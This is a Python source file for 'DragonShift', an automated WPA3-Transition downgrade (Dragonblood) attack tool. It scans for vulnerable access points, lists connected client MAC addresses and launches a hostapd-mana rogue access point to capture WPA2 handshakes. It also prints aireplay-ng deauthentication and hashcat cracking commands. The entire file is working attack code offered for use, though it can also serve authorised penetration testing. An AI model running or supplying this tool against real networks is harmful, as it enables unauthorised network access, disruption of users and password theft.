import os
import sys
import subprocess
import time
import csv
import glob
import datetime
import argparse
from scapy.all import rdpcap, Dot11Elt, Dot11Beacon, Dot11ProbeResp, Dot11
from collections import defaultdict
from colorama import Fore, Style, init

init(autoreset=True)

def print_banner():
    banner = """ 
▓█████▄  ██▀███   ▄▄▄        ▄████  ▒█████   ███▄    █   ██████  ██░ ██  ██▓  █████▒▄▄▄█████▓
▒██▀ ██▌▓██ ▒ ██▒▒████▄     ██▒ ▀█▒▒██▒  ██▒ ██ ▀█   █ ▒██    ▒ ▓██░ ██▒▓██▒▓██   ▒ ▓  ██▒ ▓▒
░██   █▌▓██ ░▄█ ▒▒██  ▀█▄  ▒██░▄▄▄░▒██░  ██▒▓██  ▀█ ██▒░ ▓██▄   ▒██▀▀██░▒██▒▒████ ░ ▒ ▓██░ ▒░
░▓█▄   ▌▒██▀▀█▄  ░██▄▄▄▄██ ░▓█  ██▓▒██   ██░▓██▒  ▐▌██▒  ▒   ██▒░▓█ ░██ ░██░░▓█▒  ░ ░ ▓██▓ ░ 
░▒████▓ ░██▓ ▒██▒ ▓█   ▓██▒░▒▓███▀▒░ ████▓▒░▒██░   ▓██░▒██████▒▒░▓█▒░██▓░██░░▒█░      ▒██▒ ░ 
 ▒▒▓  ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ░▒   ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▓   ▒ ░      ▒ ░░   
 ░ ▒  ▒   ░▒ ░ ▒░  ▒   ▒▒ ░  ░   ░   ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░▒  ░ ░ ▒ ░▒░ ░ ▒ ░ ░          ░    
 ░ ░  ░   ░░   ░   ░   ▒   ░ ░   ░ ░ ░ ░ ▒     ░   ░ ░ ░  ░  ░   ░  ░░ ░ ▒ ░ ░ ░      ░      
   ░       ░           ░  ░      ░     ░ ░           ░       ░   ░  ░  ░ ░                   
 ░                                                                                           

DragonShift v0.5 - WPA3-Transition Downgrade Attack Tool
Copyright (c) 2024, Akerva, CHAABT Moussa
    """
    print(banner)


def check_root():
    # Checks whether the script is executed with root privileges.
    if os.geteuid() != 0:
        print("[-] This script must be run with root privileges. Use sudo.")
        sys.exit(1)

def check_tools():
    # Checks required tools
    tools = [
        'ip',
        'iw',
        'iwconfig',
        'airodump-ng',
        'airmon-ng',
        'hostapd-mana'
    ]

    missing_tools = []

    for tool in tools:
        if not any(
            os.access(os.path.join(path, tool), os.X_OK) 
            for path in os.environ['PATH'].split(os.pathsep)
        ):
            missing_tools.append(tool)

    if missing_tools:
        print(f"[-] Missing required tools: {', '.join(missing_tools)}")
        sys.exit(1)
    else:
        print("[+] All required tools are present.")

def check_interface_exists(interface):
    # Checks if the network interface exists.
    try:
        result = subprocess.run(['ip', 'link', 'show', interface], capture_output=True, text=True)
        if result.returncode != 0:
            print(f"[-] Interface {interface} does not exist. Please check the interface name.")
            sys.exit(1)
    except Exception as e:
        print(f"[-] Error checking interface : {e}")
        sys.exit(1)

def check_monitor_mode(interface):
    # Checks if the interface is in monitor mode.
    try:
        result = subprocess.run(['iwconfig', interface], capture_output=True, text=True)
        if 'Mode:Monitor' in result.stdout:
            print(f"[+] The {interface} interface is in monitor mode. Starting Airodump-ng.")
        else:
            print(f"[-] Interface {interface} is not in monitor mode. Please configure it in monitor mode to continue.")
            sys.exit(1)
    except Exception as e:
        print(f"[-] Error checking if interface is in monitor mode : {e}")
        sys.exit(1)

def check_managed_mode(interface):
    # Checks if the interface is in managed mode.
    check_interface_exists(interface)
    try:
        result = subprocess.run(['iwconfig', interface], capture_output=True, text=True)
        if 'Mode:Managed' in result.stdout:
            return True
        else:
            print(f"[-] Interface {interface} is not in managed mode. Please configure it in managed mode.")
            return False
    except Exception as e:
        print(f"[-] Error checking interface {interface} : {e}")
        return False

def set_managed_mode(interface):
    # Sets the interface to managed mode and returns the interface name.
    new_interface_name = interface

    try:
        # Bring the interface down
        subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Remove the last 3 characters 'mon'
        while new_interface_name.endswith('mon'):
            new_interface_name = new_interface_name[:-3]  

        # Change the interface name ip link set wlan0mon name wlan0
        subprocess.run(['ip', 'link', 'set', interface, 'name', new_interface_name], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # Change the mode to managed
        subprocess.run(['iw', 'dev', new_interface_name, 'set', 'type', 'managed'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Bring the interface up
        subprocess.run(['ip', 'link', 'set', new_interface_name, 'up'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        print(f"\n[+] The {new_interface_name} interface is now in Managed mode.")
        return new_interface_name  # Return the name of the interface after modification
    except subprocess.CalledProcessError as e:
        print(f"[-] Error configuring {interface} in Managed mode: {e}")
        sys.exit(1)

def create_scan_directory():
    # Creates a working directory for the scan with the current date and time.
    now = datetime.datetime.now()
    folder_name = now.strftime("scan-%Y-%m-%d-%H-%M")
    os.makedirs(folder_name, exist_ok=True)
    return folder_name

def run_airodump(interface, folder_name):
    # Run airodump-ng to capture packets for 1 minute. -- Using popen to kill airodump after 1min.
    try:
        print(f"[+] Airodump-ng is running on interface {interface} for 1 minute...")
        airodump_cmd = [
            'airodump-ng', interface,
            '-w', f'{folder_name}/discovery',
            '--output-format', 'pcap',
            '--manufacturer', '--wps', '--band', 'abg'
        ]
        with open(os.devnull, 'w') as FNULL:
            airodump_process = subprocess.Popen(airodump_cmd, stdout=FNULL, stderr=FNULL)
            time.sleep(60)
            airodump_process.terminate()
        print(f"[+] Capture done. Files are saved under '{folder_name}/discovery'.")
    except Exception as e:
        print(f"[-] Error during airodump-ng execution : {e}")
        sys.exit(1)

def parse_rsn_info(rsn_info):
    # Parsing RSN information to determine WPA version, ciphers, authentication and MFP.
    version = "Unknown"
    ciphers = []
    auths = []
    mfp = "Inactive"
    
    rsn_version = int.from_bytes(rsn_info[0:2], byteorder='little')
    if rsn_version == 1:
        version = "WPA2"
    elif rsn_version == 2:
        version = "WPA3"
    
    cipher_suite_count = int.from_bytes(rsn_info[6:8], byteorder='little')
    cipher_offset = 8 + cipher_suite_count * 4
    for i in range(cipher_suite_count):
        cipher_suite = rsn_info[8 + i*4:12 + i*4]
        if cipher_suite[3] == 2:
            ciphers.append("TKIP")
        elif cipher_suite[3] == 4:
            ciphers.append("CCMP")
        elif cipher_suite[3] == 8:
            ciphers.append("GCMP")
    
    akm_suite_count = int.from_bytes(rsn_info[cipher_offset:cipher_offset+2], byteorder='little')
    akm_offset = cipher_offset + 2
    for i in range(akm_suite_count):
        akm_suite = rsn_info[akm_offset + i*4:akm_offset + (i+1)*4]
        if akm_suite[3] == 1:
            auths.append("802.1X (Enterprise)")
        elif akm_suite[3] == 2:
            auths.append("PSK")
        elif akm_suite[3] == 8:
            auths.append("SAE")
            version = "WPA3"
    
    rsn_capabilities = int.from_bytes(rsn_info[akm_offset + akm_suite_count * 4:akm_offset + akm_suite_count * 4 + 2], byteorder='little')
    if rsn_capabilities & 0b01000000:
        mfp = "Optional"
    if rsn_capabilities & 0b10000000:
        mfp = "Required"
    
    return version, ", ".join(ciphers), ", ".join(auths), mfp

def get_security_info(packet):
    # Retrieves 802.11 packet's information.
    ssid = packet[Dot11Elt].info.decode(errors="ignore")
    
    rsn_info = None
    wpa_info = None
    
    elt = packet[Dot11Elt]
    while elt:
        if elt.ID == 48:  # RSN Information (WPA2/WPA3)
            rsn_info = elt.info
        elif elt.ID == 221 and elt.info.startswith(b'\x00P\xf2\x01\x01\x00'):  # WPA Information (WPA)
            wpa_info = elt.info
        elt = elt.payload.getlayer(Dot11Elt)
    
    if rsn_info:
        version, cipher, auth, mfp = parse_rsn_info(rsn_info)
    elif wpa_info:
        version, cipher, auth, mfp = "WPA", "TKIP", "PSK", "Inactive"
    else:
        version, cipher, auth, mfp = "Unknown", "Unknown", "Unknown", "Inactive"
    
    return ssid, version, cipher, auth, mfp

def extract_channel(packet):
    # Extract the channel from a packet if available.
    channel = None
    if packet.haslayer(Dot11Beacon):
        beacon = packet[Dot11Beacon]
        try:
            channel = beacon.channel
        except AttributeError:
            pass
    elif packet.haslayer(Dot11ProbeResp):
        probe_resp = packet[Dot11ProbeResp]
        try:
            channel = probe_resp.channel
        except AttributeError:
            pass
    if channel is None:
        if packet.haslayer(Dot11):
            dot11 = packet[Dot11]
            try:
                channel = getattr(dot11, 'channel', None)
                if channel is None:
                    channel = getattr(dot11, 'Current Channel', None)
            except AttributeError:
                pass
    return channel

def analyze_pcap(file):
    # Analyzes a PCAP file to detect APs vulnerable to Dragonblood.
    packets = rdpcap(file)
    ssid_info = defaultdict(list)

    for packet in packets:
        if packet.haslayer(Dot11Beacon) or packet.haslayer(Dot11ProbeResp):
            ssid, version, cipher, auth, mfp = get_security_info(packet)
            channel = extract_channel(packet)

            if ssid not in ssid_info:
                ssid_info[ssid].append({
                    "Version": version,
                    "Cipher": cipher,
                    "Auth": auth,
                    "MFP": mfp,
                    "BSSID": packet[Dot11].addr3,
                    "Channel": channel
                })
    
    # for packet in packets:
    #     if packet.haslayer(Dot11Beacon) or packet.haslayer(Dot11ProbeResp):
    #         ssid, version, cipher, auth, mfp = get_security_info(packet)
    #         channel = None
    #         if ssid not in ssid_info:
    #             ssid_info[ssid].append({
    #                 "Version": version,
    #                 "Cipher": cipher,
    #                 "Auth": auth,
    #                 "MFP": mfp,
    #                 "BSSID": packet[Dot11].addr3,
    #                 "Channel": packet[Dot11Beacon].channel if packet.haslayer(Dot11Beacon) else None
    #             })
    
    vulnerable_aps = []
    
    # Filter and display only vulnerable APs
    unique_bssids = set()
    for ssid, details in ssid_info.items():
        for detail in details:
            if detail["BSSID"] not in unique_bssids:
                unique_bssids.add(detail["BSSID"])
                if "SAE" in detail["Auth"] and "PSK" in detail["Auth"] and detail["MFP"] == "Inactive":
                    vulnerable_aps.append({
                        "SSID": ssid,
                        "BSSID": detail["BSSID"],
                        "Channel": detail["Channel"],
                        "Version": detail["Version"],
                        "Cipher": detail["Cipher"],
                        "Auth": detail["Auth"],
                        "MFP": detail["MFP"]
                    })
    
    if not vulnerable_aps:
        print("[+] No vulnerable APs were found in the file. Exiting program.")
        return vulnerable_aps
    
    # Display vulnerable APs
    for ap in vulnerable_aps:
        print(f"\n[{Fore.RED}AP VULNERABLE TO DRAGONBLOOD{Style.RESET_ALL}] :")
        print(f"  - SSID: {ap['SSID']}")
        print(f"  - BSSID: {ap['BSSID']}")
        print(f"  - Channel: {ap['Channel']}")
        print(f"  - Security Protocol: {ap['Version']}")
        print(f"  - Cipher: {ap['Cipher']}")
        print(f"  - Authentication: {ap['Auth']}")
        print(f"  - MFP: {ap['MFP']}\n")
    
    return vulnerable_aps

def capture_stations(interface, ap, folder_name):
    # Capture stations connected to each vulnerable AP for 30 seconds.
    try:
        print(f"\n[+] Starting airodump-ng on {ap['SSID']} ({ap['BSSID']}) with channel {ap['Channel']} for 30 seconds...")
        airodump_cmd = [
            'airodump-ng',
            '-c', str(ap['Channel']),
            '--bssid', ap['BSSID'],
            '-a',
            '-w', f"{folder_name}/{ap['SSID']}-station",
            '--output-format', 'csv',
            interface
        ]
        with open(os.devnull, 'w') as FNULL:
            airodump_process = subprocess.Popen(airodump_cmd, stdout=FNULL, stderr=FNULL)
            time.sleep(30)
            airodump_process.terminate()
        print(f"[+] Capture done for {ap['SSID']}. CSV files are saved under : {folder_name}/{ap['SSID']}-station.csv")
    except Exception as e:
        print(f"[-] Error capturing stations for {ap['SSID']} : {e}")

def analyze_station_files(folder_name, ap_ssid):
    # Analyzes access point-specific CSV file to extract MAC addresses of connected stations.
    ap_file = f"{folder_name}/{ap_ssid}-station-01.csv"

    try:
        with open(ap_file, 'r') as f:
            reader = csv.reader(f)
            lines = list(reader)
            
            # Search station section
            stations = []
            start_reading = False
            for line in lines:
                if 'Station MAC' in line:
                    start_reading = True
                    continue
                
                if start_reading and line:
                    station_mac = line[0].strip()
                    if station_mac:
                        stations.append(station_mac)
        
        if stations:
            print(f"\n[+] Connected stations on {ap_ssid}:")
            for station in stations:
                print(f"  - Station MAC: {station}")
            return stations
        else:
            print(f"\n[!] No connected station found on {ap_ssid}.")
            return []
    except FileNotFoundError:
        print(f"[-] The file for AP {ap_ssid} was not found.")
        return []
    except Exception as e:
        print(f"[-] Error parsing file for AP {ap_ssid} : {e}")
        return []

def create_config_file(folder_name, ap, managed_interface):
    # Creates a configuration file for hostapd-mana if stations are connected.
    abs_folder_name = os.path.abspath(folder_name)
    config_content = f"""interface={managed_interface}
driver=nl80211
hw_mode=g
channel={ap['Channel']}
ssid={ap['SSID']}
mana_wpaout={abs_folder_name}/{ap['SSID']}-handshake.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
"""
    config_file = os.path.join(abs_folder_name, f"{ap['SSID']}-sae.conf")
    try:
        with open(config_file, 'w') as f:
            f.write(config_content)
        print(f"[+] Hostapd configuration file created: {config_file}")
        return config_file
    except Exception as e:
        print(f"[-] Error creating Hostapd configuration file: {e}")
        return None

def start_attack(config_file, checker):
    # Launches the attack using hostapd-mana and stops the process if a handshake is captured.
    if not config_file:
        return

    try:
        print(f"\n[+] Starting Rogue AP with hostapd-mana...")
        if checker:
            print(f"[!] DragonShift is now in passive mode, waiting for stations to connect on our rogue AP...\n")
        else:
            print(f"[+] Open a new terminal and run a deauth attack against the vulnerable AP and the connected client")
            print(f"[!] For deauth attack, you can use aireplay-ng like this : aireplay-ng <MONITOR INTERFACE> -0 5 -a <AP BSSID> -c <STATION MAC>\n")
            #print(f"[!!] DO NOT USE MANAGED MODE INTERFACE USED FOR THE CURRENT ROGUE AP TO PERFORM DEAUTH ATTACK\n")

        # Using subprocess.Popen to execute the command and capture the output in real time
        process = subprocess.Popen(['hostapd-mana', config_file], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        # Read output in real time and display it
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                print(output.strip())
                
                # Check for handshake capture message
                if "Captured a WPA/2 handshake from" in output:
                    print(f"\n{Fore.GREEN}[+] Handshake captured ! Shutting down Rogue AP (hostapd-mana).{Style.RESET_ALL}")
                    print("[+] Run hashcat using mode 2500 to crack the handshake")
                    print("[!] Example command : hashcat -a 0 -m 2500 <SSID>-handshake.hccapx <WORDLIST PATH> --force")
                    process.terminate()
                    break
        
        # Display errors, if any
        stderr = process.stderr.read()
        if stderr:
            print("[-] Errors from hostapd-mana :")
            print(stderr)
        
        return_code = process.poll()
        if return_code != 0:
            print(f"[-] Attack failed with return code : {return_code}")
    except Exception as e:
        print(f"[-] Error during hostapd-mana execution : {e}")

def do_stuff(interface, managed_interface, checker):
    
    # Vérifie si l'utilisateur a les privilèges nécessaires
    check_root()
    check_tools()
    check_interface_exists(interface)
    check_interface_exists(managed_interface)
    check_monitor_mode(interface)
    
    # Crée un répertoire pour les captures
    folder_name = create_scan_directory()
    
    # Lance airodump pour scanner les réseaux
    run_airodump(interface, folder_name)

    # Récupère les fichiers PCAP générés
    pcap_files = [f for f in os.listdir(folder_name) if f.startswith('discovery') and (f.endswith('.pcap') or f.endswith('.cap'))]
    all_vulnerable_aps = []

    # Analyse chaque fichier PCAP pour trouver des points d'accès vulnérables
    for pcap_file in pcap_files:
        file_path = os.path.join(folder_name, pcap_file)
        print(f"[+] Parsing PCAP file: {file_path}")
        vulnerable_aps = analyze_pcap(file_path)
        all_vulnerable_aps.extend(vulnerable_aps)
    
    # Quitte si aucun AP vulnérable n'a été trouvé
    if not all_vulnerable_aps:
        sys.exit(1)
    
    # Filtre les points d'accès pour éviter les doublons
    unique_aps = list({ap['BSSID']: ap for ap in all_vulnerable_aps}.values())
    
    created_files = []

    all_stations = {}

    # Capture les stations et crée les fichiers de configuration pour chaque AP
    for ap in unique_aps:
        capture_stations(interface, ap, folder_name)
        stations = analyze_station_files(folder_name, ap['SSID'])
        all_stations[ap['SSID']] = stations

    if checker:
        new_interface_name = set_managed_mode(managed_interface)

    for ap in unique_aps:
        stations = all_stations.get(ap['SSID'], [])
        
        if stations:
            if checker:
                config_file = create_config_file(folder_name, ap, new_interface_name)
            else:
                config_file = create_config_file(folder_name, ap, managed_interface)
            if config_file:
                created_files.append(config_file)
        else:
            print(f"[!] Skipping hostapd configuration file creation for AP {ap['SSID']} because no stations were found.")
    
    # Quitte si aucun fichier de configuration valide n'a été créé
    if not created_files:
        print("[!] No valid configuration files created. Exiting program.")
        sys.exit(1)
    
    # Demande à l'utilisateur s'il souhaite démarrer l'attaque
    while True:
        consent = input("[!] Stations are connected. Would you like to start the attack? (y/n) ").strip().lower()
        
        if consent == 'y':
            for config_file in created_files:
                start_attack(config_file, checker)
            break
        elif consent == 'n':
            print("[!] Attack aborted. Exiting program.")
            sys.exit(0)
        else:
            print("[!] Invalid input. Please enter 'y' to start the attack or 'n' to abort.")


def main():
    print_banner()

    parser = argparse.ArgumentParser(
        description="Automated WPA3-Transition Downgrade Attack Tool (Dragonblood)."
    )

    parser.add_argument(
        "-m", "--monitor",
        dest="monitor_interface",
        type=str,
        required=True,
        help="Interface to use in monitor mode."
    )
    parser.add_argument(
        "-r", "--rogue",
        dest="rogueAP_interface",
        type=str,
        required=False,
        help="Interface to use for Rogue AP during hostapd-mana launch."
    )

    args = parser.parse_args()

    monitor_interface = args.monitor_interface
    managed_interface = args.rogueAP_interface if args.rogueAP_interface else monitor_interface
    
    # Vérification de la présence des arguments
    if args.monitor_interface and not args.rogueAP_interface:
        # If only one interface provided, checker will be true == passive mode
        checker = True
        print("[!] WARNING : Only the monitor mode interface has been provided.\n"
              "The script will run in passive mode, meaning you won't be able to manually force stations to reconnect to the rogue AP. For better handshake capture, it's STRONGLY RECOMMENDED to use two interfaces: one in monitor mode for scanning and manual deauthentication, and another in managed mode to launch the rogue AP.")
        while True:
            consent = input("[!] Would you like to continue ? (y/n) ").strip().lower()
            if consent == 'y':
                do_stuff(monitor_interface, managed_interface, checker)
                sys.exit(0)
            elif consent == 'n':
                print("[!] Attack aborted. Exiting program.")
                sys.exit(0)
            else:
                print("[!] Invalid input. Please enter 'y' to continue or 'n' to abort.")
    else:
        checker = False
        if check_managed_mode(managed_interface):
            do_stuff(monitor_interface, managed_interface, checker)

if __name__ == "__main__":
    main()